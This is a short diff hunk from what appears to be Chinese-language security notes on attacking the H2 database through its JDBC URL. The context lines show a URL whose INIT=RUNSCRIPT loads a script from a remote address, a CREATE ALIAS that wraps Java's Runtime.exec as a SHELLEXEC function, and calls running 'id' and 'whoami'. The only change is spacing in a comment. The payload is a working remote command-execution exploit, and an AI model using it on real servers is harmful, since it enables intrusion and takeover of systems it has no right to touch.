@@ -47,7 +47,7 @@ jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.
 //创建别名
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
 
-//调用SHELLEXEC执行命令
+//调用 SHELLEXEC 执行命令
 CALL SHELLEXEC('id');
 CALL SHELLEXEC('whoami');
 ```
